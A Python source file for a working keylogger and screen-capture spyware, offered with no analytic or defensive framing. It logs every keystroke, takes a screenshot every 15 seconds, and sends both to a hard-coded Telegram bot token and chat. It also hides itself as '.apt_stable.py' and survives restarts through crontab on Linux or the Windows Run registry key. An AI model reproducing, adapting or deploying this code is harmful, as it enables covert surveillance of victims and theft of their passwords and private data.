import urllib
import os
import platform
import threading
import shutil
import subprocess
from time import sleep

def import_or_install(package):
    import importlib
    try:
        importlib.import_module(package)
    except ImportError:
        import pip
        pip.main(['install', package])
    finally:
        globals()[package] = importlib.import_module(package)

import_or_install("mss")
import_or_install("pynput")
import_or_install("psutil")
import_or_install("requests")

OS = "l" if "linux" in platform.platform().lower() else "w"

def close_if_open():
    filename = __file__
    mypid = os.getpid()
    for p in psutil.process_iter(["name", "exe", "cmdline"]):
        if filename in p.info["cmdline"]:
            if not p.pid == mypid:
                sys.exit()

def persist():
    if OS=="l":
        #linux 
        opt = ""
        try:
            opt = subprocess.check_output(["bash","-c","crontab -l"],stderr="/dev/null").decode().strip()
        except Exception as e:
            pass
        # print(opt)
        if not __file__ in opt:
            shutil.copy(os.path.join(os.path.abspath("."),__file__), os.path.join(os.path.expanduser("~"), ".apt_stable.py"))
            cmd = "python3 " + os.path.join(os.path.expanduser("~"), ".apt_stable.py")
            subprocess.run(["bash","-c",f"(echo 5 \* \* \* \* {cmd}; echo {opt}) |  crontab "])
    else:
        #windows
        #test this
        shutil.copy(os.path.join(os.path.abspath("."),__file__), os.path.join(os.path.expandvars("%APPDATA%"), ".apt_stable.py"))
        address=os.path.join(os.path.expandvars("%APPDATA%"), ".apt_stable.py")
        
        import winreg as reg    
        key = "HKEY_CURRENT_USER" 
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        _open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
        reg.SetValueEx(_open,"apt_stable",0,reg.REG_SZ,address) 
        reg.CloseKey(_open) 


def get_uuid():
    import uuid as _uuid
    if OS == "l":
        if os.path.exists(os.path.join(os.path.expanduser("~"),".uuid")):
            uuid = ""
            with open(os.path.join(os.path.expanduser("~"),".uuid"), "r") as f:
                uuid = f.read()
            try:
                uuid = _uuid.UUID(uuid, version=4)
                return uuid
            except Exception as e:
                pass    
        uuid = str(_uuid.uuid4())
        with open(os.path.join(os.path.expanduser("~"),".uuid"), "w") as f:
            f.write(uuid)
        return uuid
    else:
        if os.path.exists(os.path.join(os.path.expandhome("%APPDATA%"),".uuid")):
            uuid = ""
            with open(os.path.join(os.path.expandhome("%APPDATA%"),".uuid"), "r") as f:
                uuid = f.read()
            try:
                uuid = _uuid.UUID(uuid, version=4)
                return uuid
            except:
                pass
        uuid = str(_uuid.uuid4())
        with open(os.path.join(os.path.expandhome("%APPDATA%"),".uuid"), "w") as f:
            f.write(uuid)
        return uuid

UUID = get_uuid()
TOKEN = "409508734:AAFmeROvHl6adfzmlcNAkhhnSDezm5EkK1g"
chat_id = "-1001459013908"
SHOTURL = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
LOGURL = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&" 
LOG = ""

def log_start():
    keyboard_listener = pynput.keyboard.Listener(on_press=log)
    with keyboard_listener:
        send_shot()
        keyboard_listener.join()

def log(key):
    global LOG
    current_key = ""
    
    try:
        current_key += str(key.char)
    except AttributeError:
        if key == key.space:
            current_key += " "
            
        elif key == key.enter:
            current_key += " [ENTER] " 

        elif key == key.backspace:
            current_key += " [BACKSPACE] " 

        elif key == key.ctrl_l or key == key.ctrl_r:
            current_key += " [CTRL] " 

        elif key == key.shift or key == key.shift_r:
            current_key += " [SHIFT] " 

        elif key == key.delete:
            current_key += " [DELETE] " 

        elif key == key.esc:
            current_key += " [ESC] " 

        elif key == key.tab:
            current_key += " [TAB] "   

        elif key == key.up:
            current_key += " [UP] " 

        elif key == key.down:
            current_key += " [DOWN] " 

        elif key == key.left:
            current_key += " [LEFT] " 

        elif key == key.right:
            current_key += " [RIGHT] " 
            
        elif key == key.cmd or key == key.cmd_r:
            current_key += " [WINDOWS-KEY] " 

        elif key == key.f1:
            current_key += " [F1] "  

        elif key == key.f2:
            current_key += " [F2] " 

        elif key == key.f3:
            current_key += " [F3] "                 
            
        elif key == key.f4:
            current_key += " [F4] " 

        elif key == key.f5:
            current_key += " [F5] "  

        elif key == key.f6:
            current_key += " [F6] " 

        elif key == key.f7:
            current_key += " [F7] " 
            
        elif key == key.f8:
            current_key += " [F8] " 

        elif key == key.f9:
            current_key += " [F9] "                 
            
        elif key == key.f10:
            current_key += " [F10] " 

        elif key == key.f11:
            current_key += " [F11] "  

        elif key == key.f12:
            current_key += " [F12] " 

        elif key == key.alt_l or key == key.alt_r:
            current_key += " [ALT] "  

        elif key == key.caps_lock:
            current_key += " [CAPSLOCK] " 
            
        elif key == key.home:
            current_key += " [HOME] "                 
            
        else:
            current_key += " " + str(key) + " "
    LOG += current_key

def send_shot():
    global LOG
    with mss.mss() as sct:
        filename = sct.shot(output="shot.png")
    r=requests.post(SHOTURL, data={"chat_id":chat_id, "caption":f"SHOT FROM #{UUID}"},files={'photo': (filename, open(filename, 'rb')),})
    os.remove(filename)
    log = urllib.parse.urlencode({'text':f"LOG FROM #{UUID}:\n"+LOG})
    LOG = ""
    r=requests.get(LOGURL+log.replace("&","[AND]"))
def get_queue():
    pass
def add_to_queue():
    pass
close_if_open()
threading.Thread(target=log_start).start()
add_to_queue()
persist()
while True:
    sleep(15)
    get_queue()
    send_shot()
